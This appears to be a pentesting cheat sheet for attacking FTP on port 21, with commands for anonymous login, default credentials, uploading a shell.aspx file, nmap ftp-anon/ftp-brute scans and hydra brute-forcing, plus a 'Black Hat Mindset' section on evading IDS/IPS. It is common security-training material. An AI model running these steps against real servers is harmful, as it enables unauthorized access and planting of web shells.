# Basic Methodology - Port 21 (FTP)

This README explores exploiting the File Transfer Protocol (FTP) on port 21, focusing on anonymous login attempts, file transfer for payload delivery, Nmap NSE script usage, and brute-force attacks to gain unauthorized access.
## Table of Contents

- [Introduction](#introduction)
- [Setup and Prerequisites](#setup-and-prerequisites)
- [Anonymous Login and Password Reuse](#anonymous-login-and-password-reuse)
- [Transferring Files](#transferring-files)
- [Nmap NSE Scripts](#nmap-nse-scripts)
- [Brute-Force Attacks](#brute-force-attacks)
- [Black Hat Mindset](#black-hat-mindset)
- [Resources](#resources)

## Introduction

FTP on port 21 is often used for file sharing but can be a weak point if misconfigured, allowing anonymous access or vulnerable to credential guessing. This guide covers connecting via anonymous login, transferring files (e.g., shells), scanning with Nmap NSE scripts, and brute-forcing credentials to compromise the server.

## Setup and Prerequisites

- **Environment**: Linux or Windows host with network access to the target FTP server.
- **Tools**: Install `ftp` (e.g., `apt install ftp` on Linux), `telnet`, `nmap`, `hydra`, and optionally FileZilla or Sparta GUI.
- **Wordlists**: Prepare a password file (e.g., `password-file.txt`) or use `/usr/share/wordlists/rockyou.txt`.
- **IP Address**: Identify the target IP address (e.g., `<IP address>` from initial enumeration).
- **Permissions**: No authentication is needed for anonymous login; valid credentials are required for brute-force.

## Anonymous Login and Password Reuse

Attempt to access the FTP server without credentials or with default ones.

```bash
# Connect to FTP server
$ ftp <IP address>

# Using FileZilla GUI
# Open FileZilla, enter <IP address> as the host, and attempt to connect anonymously.

# Browser access
ftp://<IP address>

# Test connectivity with telnet
$ telnet <IP address>
```

### Credentials:
- Username: `ftp` Password: `ftp`
- Username: `anonymous` Password: `anonymous`
- Test common defaults like `admin/admin` or `guest/guest`

## Transferring Files

Upload or download files to deliver payloads or extract data.

```bash
# Download files
ftp> get file.txt

# Upload files
ftp> put shell.aspx
```

## Nmap NSE Scripts

Scan for FTP vulnerabilities using Nmap's scripting engine.

```bash
# List available FTP scripts
$ ls -la /usr/share/nmap/scripts | grep "ftp"

# Check for anonymous login
$ nmap -p 21 --script ftp-anon <IP address>

# Attempt credential brute-force
$ nmap -p 21 --script ftp-brute <IP address>
```

## Brute-Force Attacks

Guess credentials to gain access to restricted FTP servers.

```bash
# Hydra brute-force with custom wordlist
$ hydra -l root -P password-file.txt <IP address> ftp

# Hydra with rockyou wordlist
$ hydra -l root -P /usr/share/wordlists/rockyou.txt ftp://<IP address>

# Sparta GUI
# Open Sparta, configure an FTP module with a wordlist, and target <IP address>
```

## Black Hat Mindset

- **Probe Anonymously**: Test for open anonymous access to upload shells without credentials.
- **Exploit Weaknesses**: Use Nmap scripts to find vulnerabilities before attacking.
- **Crack Credentials**: Target default or weak passwords with hydra or Sparta to gain full control.
- **Stay Undetected**: Upload payloads quietly and avoid triggering IDS/IPS during brute-force.

## Resources

- [FTP Protocol](https://en.wikipedia.org/wiki/File_Transfer_Protocol)
- [Nmap NSE Documentation](https://nmap.org/nsedoc/)
- [Hydra Manual](https://github.com/vanhauser-thc/thc-hydra)
- [Sparta GitHub](https://github.com/SECFORCE/sparta)
- [FileZilla Guide](https://wiki.filezilla-project.org/Main_Page)

